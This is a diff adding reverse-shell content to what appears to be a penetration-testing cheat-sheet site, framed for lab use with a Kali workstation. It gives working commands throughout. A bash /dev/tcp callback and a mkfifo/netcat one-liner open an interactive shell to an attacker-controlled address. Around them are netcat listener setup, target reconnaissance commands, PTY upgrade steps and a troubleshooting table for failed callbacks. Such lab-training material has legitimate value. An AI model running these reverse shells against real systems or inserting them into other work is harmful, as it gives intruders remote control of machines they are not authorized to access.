@@ -9,6 +9,120 @@ hideFooterPagination: true
 
 {/* Generated from Commands/linux-reverse-shell.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Turn execution into a usable session
+
+First establish that a simple command runs and identify the account. Then choose a session method that matches the target OS, installed programs, network direction and required interactivity. A shell connection, an elevated token and a stable terminal are different milestones.
+
+### Establish execution and network context
+
+```bash
+# Linux target:
+id
+uname -a
+command -v bash python3 nc curl
+ip route
+```
+
+```powershell
+# Windows target:
+whoami
+whoami /priv
+$PSVersionTable.PSVersion
+ipconfig
+```
+
+Keep command output with the application/process that executed it. A web server worker and an interactive user session may have different accounts, environment variables, permissions and network access.
+
+### Prepare and test the receiving side
+
+```bash
+# Workstation:
+nc -lvnp 4444
+ip -br addr
+ss -lntp
+```
+
+Use an address reachable from the target, often the lab/VPN interface rather than a local desktop network. A listener is only one side of the path; a target's outbound filtering or route can prevent the callback.
+
+### Use the target's actual shell syntax
+
+```bash
+# Linux target, explicitly using Bash:
+bash -c 'bash -i >& /dev/tcp/WORKSTATION_IP/4444 0>&1'
+```
+
+This relies on Bash behavior and a permitted TCP path. If the entry point applies URL, JSON or form encoding, account for that transport separately from shell quoting. Do not assume a command that works in a terminal can be pasted unchanged into every web parameter.
+
+For Windows, use the platform-specific payload examples below or the Windows reverse-shell tool page. Match staged/stageless payload choice, architecture and handler settings if using a framework. A raw Netcat listener is not a substitute for every specialized handler.
+
+### Upgrade a Linux terminal deliberately
+
+```bash
+# In the received remote shell:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+Suspend the local foreground Netcat process with Ctrl-Z, record the local terminal dimensions, then put that local terminal into raw mode and resume the connection:
+
+```bash
+# Local workstation terminal after Ctrl-Z:
+stty size
+stty raw -echo; fg
+```
+
+```bash
+# Remote shell: use the rows/columns reported by the local terminal.
+stty rows ROWS columns COLUMNS
+```
+
+Test input, job control and an interactive command. If the session exits and the local terminal becomes unreadable, restore it with `stty sane` or `reset` in that local terminal.
+
+### Diagnose the missing milestone
+
+| Result | Next investigation |
+| --- | --- |
+| Simple command fails | Injection/quoting, process context and available binary |
+| Command works, no callback | Listener bind, reachable callback IP, port, egress and payload syntax |
+| TCP connects then exits | Payload/handler mismatch, process lifetime, stdin/stdout handling |
+| Shell works but interactive program fails | PTY, terminal mode, dimensions and environment |
+| Shell works but admin command fails | Actual user, groups, privileges and elevation |
+| Shell disappears with request | Parent process lifetime and the execution mechanism |
+
+Keep a stable authorized session before moving to local enumeration or transfers. Record the exact successful method so a later tunnel or privilege step is not blamed for a fragile initial shell.
+
+## Linux → Kali reverse shell: choose the operation and read the result
+
+Listen on Kali, then connect from the Linux target.
+
+### What the result establishes
+
+Verify which shell is executing the payload and which network address is reachable from the target.
+
+### Prerequisites and common failures
+
+Bash-specific redirections do not work in every /bin/sh implementation; a listener on the wrong interface cannot receive the callback.
+
+### Example 1: 1. Kali — listener
+
+Run in: **Kali**.
+
+```bash
+nc -lvnp 7777
+```
+
+### Example 2: 2. Linux target — connect
+
+Run in: **Linux target**. Replace &lt;ATTACKER_IP>; the saved recipe uses /tmp/f.
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
+```
+
+## Saved commands and notebook recipes
+
+Listen on Kali, then connect from the Linux target.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=linux-reverse-shell) · [All tools](/index)
@@ -29,6 +143,21 @@ nc -lvnp 7777
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 7777 > /tmp/f
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Bash Reverse Shell One-Liner (Linux Target)](/exploitation/shells-payloads-cheat-sheet#bash-reverse-shell-one-liner-linux-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 Replace &lt;ATTACKER_IP>; the saved recipe uses /tmp/f.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
